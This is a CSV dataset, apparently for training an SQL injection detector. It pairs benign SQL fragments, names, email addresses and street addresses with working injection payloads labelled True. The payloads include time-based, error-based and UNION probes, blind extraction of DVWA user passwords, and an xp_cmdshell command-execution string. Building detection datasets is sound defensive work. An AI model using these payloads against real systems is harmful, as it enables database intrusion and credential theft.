Query,SQLIA
; exec master..xp_cmdshell 'ping 10.10.1.2'--,True
SELECT TOP 3 * FROM airplane SELECT * FROM natural 3SELECT * FROM doing,False
winston@chinavende.bi,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),7,1))>52 AND 'bSNt'='bSNt",True
"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",True
 or 2 between 1 and 3,True
"  SELECT * FROM sent WHERE result NOT IN  ( 'scale', 'buried', 'basket' )  ",False
"1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'niro'  =  'niro",True
"-1917""  )   or 8571  =  8571--",True
rombeek,False
1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,True
"  SELECT create,bottom FROM pretty WHERE familiar = 'play' UNION SELECT tower, opinion FROM go",False
"1""  )   where 3390  =  3390",True
"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",True
buitrago pontigo,False
"1""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""pdsy"" like ""pdsy",True
SELECT Count ( * )  AS completely,False
"1""  )   as ymto where 3453  =  3453",True
"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",True
"-1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",True
"  SELECT ADDTIME ( ""09:34:21.000001"", ""2:10:5.000003"" ) ;",False
1'||  (  select 'wszt' from dual where 6854  =  6854 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',True
select   (  case when   (  7163  =  1777  )   then 1 else 7163*  (  select 7163 from master..sysdatabases  )   end  )  --,True
1' where 8770  =  8770 union all select null--,True
SELECT pen ( s )  FROM famous UNION ALL,False
1'   )    )     )   and 7533  =  7533 and    (    (     (  'txex'  =  'txex,True
wilbur,False
DELETE FROM busy,False
1%'  )   waitfor delay '0:0:5' and   (  '%'  =  ',True
2.47397E+15,False
SELECT * FROM let,False
batllori budi,False
a' or 'a'   =   'a,True
DELETE FROM studied WHERE serious = 'refer',False
1'   )    )     )   and 8162  =  1687 and    (    (     (  'tdyr' like 'tdyr,True
"   SELECT Employees.carbon, COUNT ( Orders.viewID )  AS dugFROM    ( OrdersINNER JOIN constantly ON Orders.islandID  =  Employees.blockID ) ",False
"1' in boolean mode  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #",True
SELECT * FROM sound WHERE after NOT LIKE 'alive%',False
"-4015"" where 2610  =  2610 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",True
SELECT AVG ( dropped ) FROM worth,False
delfina,False
8708,False
"1%'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  '%'  =  '",True
; execute immediate 'sel' || 'ect us' || 'er',True
sitiwet-chagas@creacionesacampada.travel,False
SELECT * FROM widely WHERE standard BETWEEN 'experience' AND 'list',False
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c830bdbb26' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),12,1))>96 AND 'TkwJ'='TkwJ",True
"carrer mestre albages 61,",False
select   (  case when   (  4393  =  2875  )   then 1 else 4393*  (  select 4393 from master..sysdatabases  )   end  )  --,True
SELECT DISTINCT command FROM gradually,False
SELECT * FROM nearly WHERE    NOT find = 'add',False
SELECT shelf ( s )  FROM none UNION ALL,False
"1'||  (  select 'scwx' where 6591  =  6591 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  ||'",True
dottin,False
SELECT map ( s )  FROM outside LEFT JOIN,False
SELECT * FROM freedom FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM motion,False
"   SELECT ants, farther, opposite FROM lack WHERE college  IS NULL",False
"-4210""  )   where 2679  =  2679 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",True
SELECT * FROM amount WHERE facing LIKE '%certain%',False
SELECT COUNT ( DISTINCT complete )  FROM wish,False
SELECT * FROM sudden FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM soldier,False
SELECT * FROM order,False
SELECT pale ( s )  FROM paper,False
SELECT * FROM cold WHERE fireplace = 'bread',False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),7,1))>49 AND 'bSNt'='bSNt",True
"-5196""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""gbcq"" like ""gbcq",True
"1%""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",True
SELECT TOP 50 PERCENT * FROM however SELECT * FROM recognize FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wealth,False
urbon,False
SELECT * FROM morning FETCH FIRST 50 PERCENT ROWS ONLY,False
a4go37a,False
"1%"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),16,1))>116 AND 'TszS'='TszS",True
select   (  case when   (  9103  =  9836  )   then 9103 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,True
1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  4968  =  4968,True
"c/ mijancas, 154 3?c",False
select pg_sleep  (  5  )   and 'rpka'  =  'rpka,True
"SELECT * FROM around WHERE laugh BETWEEN ""research"" AND    ""greatly""",False
SELECT * FROM  ( SELECT attack FROM nearby ) ,False
"-1439"" or 2849  =  8484 and ""pmdl""  =  ""pmdl",True
invo3unta6i5,False
"1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  9841  =  9841",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),2,1))>64 AND 'OqWN'='OqWN",True
15142,False
"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'nopu'  =  'nopu",True
-3867%'  )   or 3084  =  5633 and   (  '%'  =  ',True
9600,False
cherwin4@xavipetit.mu,False
1   )    )    as iihk where 5414  =  5414 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,True
or 'unusual'   =   'unusual',True
"1' and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",True
1' where 8537  =  8537 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,True
"1%""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,True
" SELECT column_name ( s )  FROM tea,child",False
-8963  )   where 8528  =  8528 or   (  2470  =  3271  )  *3271--,True
"1%'   )    )    union all select null,null,null,null,null,null,null,null--",True
ilya,False
"-7202%""   )    )    union all select 2901#",True
8.64151E+15,False
glyn7,False
"-3035""  )   union all select 7912,7912,7912#",True
" SELECT * FROM quarter ORDER BY sold ASC, flew DESC",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`comment` AS NCHAR),0x20) FROM dvwa.guestbook ORDER BY `name` LIMIT 0,1),6,1))>104 AND 'uEgY'='uEgY",True
"  UPDATE him SET belt =  'pleasant', City =  'particular' WHERE account =  above",False
"1   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   8280  =  8280",True
SELECT TOP 3 * FROM decide,False
"1%"" union all select null,null,null,null,null,null,null#",True
SELECT TOP 3 * FROM keep SELECT * FROM nearby 3SELECT * FROM improve,False
"1'+  (  select 'drvv' where 5622  =  5622 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",True
1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 1,1),6,1))>90 AND 'KwMp'='KwMp",True
"1""   )    )    as vbdo where 3882  =  3882",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761 LIMIT 1,1),2,1))>104 AND 'bccT'='bccT",True
" SELECT column_name ( s )  FROM least,composed",False
zool7ic1,False
SELECT * FROM her FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM driving,False
SELECT mood ( s )  FROM vessels UNION ALL,False
SELECT TOP 50 PERCENT * FROM coming SELECT * FROM location FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM found,False
"-8477' union all select 2517,2517,2517--",True
"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'kpsg' like 'kpsg",True
killan@923.fr,False
"1%""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",True
"1%'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",True
"1   )    )    as ambt where 5198  =  5198 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",True
1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'snoa'  =  'snoa,True
"gredos, 114 12?g",False
kuzz,False
"   SELECT COUNT ( conversation ) , under FROM anything BY seen",False
" SELECT column_name ( s )  FROM ago,alike",False
gaylord,False
3st59et982,False
"  SELECT * FROM game WHERE tie NOT IN  ( 'glad', 'dig', 'largest' )  ",False
1   )    )    as sfan where 7176  =  7176 and 7017  =  7358,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),10,1))>107 AND 'epJT'='epJT",True
SELECT TOP 3 * FROM seldom WHERE fresh = 'piano',False
1   )    )    as ipfy where 1189  =  1189,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),32,1))>51 AND 'JUqW'='JUqW",True
"-2197' union all select 8065,8065,8065,8065--",True
"1  )   as caoa where 6139  =  6139 union all select null,null,null,null,null,null,null,null--",True
hollywood.hausman@921.th,False
"1'  )   where 9091  =  9091 union all select null,null,null,null#",True
"   SELECT Employees.examine, COUNT ( Orders.tailID )  AS cellFROM    ( OrdersINNER JOIN teeth ON Orders.fenceID  =  Employees.cageID ) ",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),2,1))>87 AND 'upay'='upay",True
"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ",True
"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'ykoz'  =  'ykoz",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),6,1))>64 AND 'epJT'='epJT",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),11,1))>100 AND 'vyMm'='vyMm",True
"1%"" and 4595  =  4595#",True
SELECT * FROM birthday ORDER BY court DESC,False
-4768'||  (  select 'dded' from dual where 6499  =  6499 union all select 6499--,True
cuevas labradas,False
"1'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'ogwd' like 'ogwd",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),9,1))>96 AND 'TszS'='TszS",True
SELECT far FROM high UNION SELECT old FROM purple ORDER BY similar,False
-2374  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  2576  =  2576,True
select   (  case when   (  4059  =  7807  )   then 4059 else 1/  (  select 0  )   end  )  --,True
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",True
"  SELECT mineID AS ID, all AS property FROM shore",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),8,1))>56 AND 'Tfyt'='Tfyt",True
1   )    )    as ndrh where 6308  =  6308,True
-2411 or   (  8459  =  8459  )  *4906# pxwg,True
"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'gcna'  =  'gcna",True
1'||  (  select 'vwls' where 5252  =  5252 rlike sleep  (  5  )  #,True
7.40029E+15,False
SELECT brave FROM tongue UNION ALL SELECT ought FROM business ORDER BY specific,False
1 and 1  =  1,True
" select * from users where id  =  1 or ""1["" or 1  =  1 -- 1",True
"1%""   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  ""%""  =  """,True
"1""  )   where 7753  =  7753",True
"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",True
"-7248'  )   where 4626  =  4626 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",True
castrillo de la valduerna,False
SELECT * FROM wp_posts WHERE ID  =  28450 LIMIT 1,False
"-5224'  )   where 1962  =  1962 union all select 1962,1962,1962,1962,1962,1962,1962,1962,1962--",True
SELECT * FROM rubber 3 SELECT * FROM average,False
9.45491E+14,False
1%'   )    )     )   and 4595  =  4595#,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`comment` AS NCHAR),0x20) FROM dvwa.guestbook ORDER BY `name` LIMIT 0,1),21,1))>112 AND 'uEgY'='uEgY",True
"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""uqor"" like ""uqor",True
"1' in boolean mode  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",True
"c/ montereria, 146 4d",False
SELECT * FROM eaten WHERE left = 'construction' LIMIT 3,False
"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'dreq'  =  'dreq",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 1,1),6,1))>94 AND 'KwMp'='KwMp",True
radresa aja,False
vachiran,False
iruraiz-gauna,False
"-2071 union all select 4753,4753--",True
-2869'   )    )    union all select 3216--,True
"1"" where 7022  =  7022",True
a5aranjada,False
"1""  )   where 9621  =  9621",True
1' where 1844  =  1844,True
SELECT AVG ( truck ) FROM space,False
villanueva de huerva,False
select   (  case when   (  7980  =  3703  )   then 7980 else 7980*  (  select 7980 from information_schema.character_sets  )   end  )  #,True
"1%"" union all select null,null--",True
potroso,False
SELECT * FROM but,False
"  SELECT * FROM claws WHERE pour NOT IN  ( 'mountain', 'began', 'prove' )  ",False
SELECT AVG ( yet ) FROM wrong,False
SELECT * FROM structure WHERE brought BETWEEN '1996-07-01' AND '1996-07-31',False
" SELECT * FROM balloon ORDER BY climate, mostly",False
jaln de cameros,False
SELECT * FROM with WHERE dress = 'band' LIMIT 3,False
"iif  (  8214  =  4954,1,1/0  )  ",True
lindt38,False
"1%""   )    )     )   and make_set  (  8191  =  7813,7813  )   and    (    (     (  ""%""  =  """,True
SELECT * FROM hurry WHERE scientific BETWEEN '1996-07-01' AND '1996-07-31',False
"   SELECT jet, city+ ', ' + soil+ ' ' + growth+ ', ' + entire AS wrote  FROM play",False
"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",True
"-9721' or elt  (  9511  =  9238,9238  )  ",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`comment` AS NCHAR),0x20) FROM dvwa.guestbook ORDER BY `name` LIMIT 0,1),17,1))>104 AND 'uEgY'='uEgY",True
select   (  case when   (  2783  =  9216  )   then 1 else 2783*  (  select 2783 from master..sysdatabases  )   end  )  --,True
SELECT AVG ( ready ) FROM pure SELECT SUM ( chapter ) ,False
SELECT * FROM wind WHERE NOT basis = 'soon'  AND NOT land = 'front',False
" select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",True
SELECT * FROM former,False
93698052p,False
60,False
a7av5nc6,False
1'   )    )    as yyrx where 5600  =  5600,True
"1""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""msjh"" like ""msjh",True
"-9676 or elt  (  1032  =  1032,3623  )  # jcaq",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),26,1))>108 AND 'IlVZ'='IlVZ",True
21208,False
"iif  (  7889  =  5114,1,1/0  )  ",True
7.05E+15,False
SELECT TOP 3 * FROM activity WHERE suddenly = 'traffic' SELECT * FROM sale,False
ga27393,False
? or 1  =  1 --,True
""" or true--",True
SELECT TOP 3 * FROM between,False
hasan,False
ligurs,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(first_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),2,1))>100 AND 'CRxB'='CRxB",True
"   SELECT wood, hardly+ ', ' + mental+ ' ' + poor+ ', ' + getting AS diagram  FROM vast",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),23,1))>52 AND 'Tfyt'='Tfyt",True
SELECT * FROM bone WHERE blue = 'situation' FETCH FIRST 3 ROWS ONLY,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),21,1))>57 AND 'JUqW'='JUqW",True
"   SELECT behavior,title,dress,officer,before     (  (  mouth JOIN master ON statement.up =  do.ought )   INNER JOIN equalON Orders.nothing =  continent.bellID ) ",False
SELECT * FROM manufacturing FETCH FIRST 3 ROWS ONLY,False
knio,False
SELECT TOP 50 PERCENT * FROM position,False
"-5386'  )   union all select 8026,8026,8026,8026,8026,8026#",True
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""tgdu""  =  ""tgdu",True
en9r195d9,False
"  SELECT bagID AS ID, rush AS young FROM material",False
goertzen,False
ansorger,False
SELECT * FROM strength ORDER BY difference,False
select   (  case when   (  8820  =  4648  )   then 8820 else 8820*  (  select 8820 from information_schema.character_sets  )   end  )  #,True
cibeles,False
SELECT * FROM beginning ORDER BY flight DESC,False
narrillos del lamo,False
SELECT * FROM wp_houzez_crm_viewed_listings WHERE listing_id  =  27990 AND user_id  =  0,False
"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'xuwl' like 'xuwl",True
"1%""   )    )     )   union all select null,null,null,null,null,null--",True
9.30174E+15,False
gunther@nik.com.tn,False
"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""jgoq""  =  ""jgoq",True
congregation@saludyfitness.pm,False
SELECT MIN ( compound )  AS underline FROM crowd,False
"1%'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   '%'  =  '",True
thordsen@guejos.sy,False
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""qkat""  =  ""qkat",True
",s",True
79039106c,False
SELECT * FROM passage WHERE closely = 'special' LIMIT 3,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),28,1))>105 AND 'stCx'='stCx",True
"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",True
"  UPDATE until SET column =  'attached', City =  'coat' WHERE rather =  wing",False
"1',  (  select   (  case when   (  9644  =  9644  )   then dbms_pipe.receive_message  (  chr  (  75  )  ||chr  (  78  )  ||chr  (  104  )  ||chr  (  98  )  ,5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",True
SELECT * FROM town WHERE industrial = 'under'  AND City = 'mill',False
SELECT diagram ( s FROM actual RIGHT JOIN,False
SELECT AVG ( later )  FROM gray  SELECT SUM ( salmon ) ,False
"-3081""   )    )     )   or 3736  =  1899",True
select * from users where id  =  1 +1 or 1  =  1 -- 1,True
"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",True
"1' union all select null,null,null#",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),1,1))>80 AND 'ybro'='ybro",True
46266,False
"1"" and   (  3020  =  3020  )  *6703 and ""tnzp"" like ""tnzp",True
"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh",True
"1'+  (  select 'cstd' where 9326  =  9326 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  +'",True
braham,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),17,1))>67 AND 'uBuU'='uBuU",True
"1%'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  '%'  =  '",True
"-3775'  )   as rqet where 7092  =  7092 or elt  (  1032  =  1032,3623  )  --",True
"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,True
"INSERT INTO what  ( who, score, separate )  VALUES  ( 'duty', 'dirty', 'turn' )  ",False
SELECT * FROM earth WHERE duty = 'sign'  AND City = 'loose',False
akashi1@g-audio.td,False
"  UPDATE tomorrow SET plant =  'or', City =  'nearer' WHERE garden =  pipe",False
nicole-meyer@creacionesdolcevita.us,False
SELECT * FROM pocket WHERE railroad LIKE '%lungs%',False
SELECT * FROM dry  WHERE attempt = function,False
"1"" where 1203  =  1203 union all select null,null,null--",True
SELECT dropped ( s ) FROM road INNER JOIN,False
SELECT paint ( s )  FROM saddle SELECT full ( s ) ,False
